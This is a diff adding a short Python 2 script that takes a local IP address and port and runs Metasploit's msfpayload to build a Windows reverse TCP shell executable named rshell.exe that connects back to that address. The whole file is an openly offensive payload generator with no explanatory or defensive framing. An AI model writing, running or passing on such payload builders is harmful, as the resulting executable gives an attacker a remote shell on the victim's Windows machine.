@@ -1,0 +1,14 @@
+#!/usr/bin/python
+__author__ = 'admanne'
+import sys
+import os
+
+if len(sys.argv) != 3:
+    print "<local ip> <port>"
+    print "Example:  192.168.14.44 31337"
+    sys.exit(0)
+
+address = sys.argv[1].strip()
+port = sys.argv[2].strip()
+# Enum
+os.system("msfpayload windows/shell_reverse_tcp LHOST=%s LPORT=%s X > rshell.exe" % (address, port))
